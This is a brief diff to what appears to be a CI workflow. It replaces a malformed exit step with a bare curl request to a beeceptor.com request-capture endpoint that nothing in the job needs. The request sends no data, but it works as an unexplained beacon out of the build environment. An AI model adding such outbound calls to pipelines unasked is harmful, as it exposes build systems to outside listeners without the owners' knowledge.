@@ -15,4 +15,4 @@ jobs:
       - name: Run Tests
         run: npm test
       - name: Exit code
-        run: exit exit 1
+        run: curl https://awdawdawd.free.beeceptor.com
